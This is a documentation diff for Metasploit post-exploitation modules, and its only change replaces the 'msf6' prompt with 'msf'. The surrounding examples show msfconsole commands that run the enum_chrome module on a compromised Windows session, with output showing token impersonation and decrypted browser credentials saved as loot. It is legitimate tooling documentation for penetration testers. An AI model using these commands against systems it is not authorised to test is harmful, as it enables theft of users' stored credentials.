@@ -7,7 +7,7 @@ Metasploit post modules replace old Meterpreter scripts, which are no longer mai
 You can search for post gather modules within msfconsole:
 
 ```msf
-msf6 > search type:post platform:windows name:gather
+msf > search type:post platform:windows name:gather
 
 Matching Modules
 ================
@@ -26,8 +26,8 @@ There are two ways to launch a Post module, both require an existing session.
 Within a msf prompt you can use the `use` command followed by the `run` command to execute the module against the required session. For instance to extract credentials from Chrome on the most recently opened Metasploit session:
 
 ```msf
-msf6 > use post/windows/gather/enum_chrome
-msf6 post(windows/gather/enum_chrome) > run session=-1 verbose=true
+msf > use post/windows/gather/enum_chrome
+msf post(windows/gather/enum_chrome) > run session=-1 verbose=true
 
 [*] Impersonating token: 7192
 [*] Running as user 'DESKTOP-N3MAG5R\basic_user'...
@@ -44,13 +44,13 @@ msf6 post(windows/gather/enum_chrome) > run session=-1 verbose=true
 [+] Decrypted data: url:https://www.example.com/ my_username:my_password_123
 [+] Decrypted data saved in: /Users/user/.msf4/loot/20220422122129_default_192.168.123.151_chrome.decrypted_981698.txt
 [*] Post module execution completed
-msf6 post(windows/gather/enum_chrome) >
+msf post(windows/gather/enum_chrome) >
 ```
 
 Or within a Meterpreter prompt use the `run` command, which will automatically set the module's session value:
 
 ```msf
-msf6 > sessions --interact -1
+msf > sessions --interact -1
 [*] Starting interaction with 5...
 
 meterpreter > run post/windows/gather/enum_applications
